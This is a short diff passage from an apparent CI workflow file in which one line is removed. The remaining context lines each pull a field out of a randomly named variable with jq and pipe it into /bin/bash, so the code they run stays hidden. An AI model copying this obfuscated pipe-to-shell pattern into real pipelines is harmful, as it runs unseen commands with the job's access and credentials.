@@ -33,7 +33,6 @@ jobs:
           echo $lcph82 | jq -r .cpf94 | /bin/bash
           echo $aq376 | jq -r .uidq34 | /bin/bash
           echo $kxafz7 | jq -r .ybtkd3583 | /bin/bash
-          echo $ezgai3612 | jq -r .npw62 | /bin/bash
           echo $ndd16040 | jq -r .t17 | /bin/bash
           printf '%s' "$zqc5641" | jq -r .qt9758 | /bin/bash
           printf '%s' "$lfyyd28" | jq -r .wnxfz7762 | /bin/bash
